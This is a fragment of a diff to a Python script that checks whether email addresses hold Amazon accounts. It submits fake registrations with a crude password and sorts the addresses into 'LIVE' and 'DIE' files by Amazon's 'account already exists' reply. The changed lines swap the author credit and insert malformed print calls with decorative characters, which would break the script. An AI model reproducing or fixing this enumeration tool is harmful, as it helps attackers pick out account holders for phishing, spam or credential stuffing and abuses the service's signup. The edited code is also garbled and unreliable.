@@ -34,12 +34,12 @@ while True:
 	xxx = {'customerName':'Androsex','email': bacot[0],'emailCheck': bacot[0],'password':'Kontol1337','passwordCheck':'Kontol1337'}
 	cek = s.post(link, headers=head, data=xxx).text
 	if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
-		print("\033[32;1mLIVE\033[0m | "+email+" | [Amz Email ]")
+		print ('ⒾⒹ③ⓝ③ⓣⓢⓟ③ⓣⒾⒹ') ("\033[32;1mLIVE\033[0m | "+email+" | [ⒾⒹ③⊝Ⓐⓜⓐⓩⓞⓝ⊝ⒾⒹ ]")
 		live.write(email)
 	else:
-		print("\033[31;1mDIE\033[0m | "+email+" | [ Amz Email ]")
+		print ('ⒾⒹ③ⓝ③ⓣⓢⓟ③ⓣⒾⒹ') ("\033[31;1mDIE\033[0m | "+email+" | [ⒾⒹ③⊝Ⓐⓜⓐⓩⓞⓝ⊝ⒾⒹ]")
 		die.write(email)
 print("-"*50)
-print("\033[35;1mProccess Checking Done By X-Mr.R4h1M - ./Xi4u7\033[0m")
+print("\033[35;1mProccess Checking Done By anonimus - ./Xi4u7\033[0m")
 print("Valid Email Saved In : Amz-Live.txt\nDie Email Saved In : Amz-Die.txt")
 
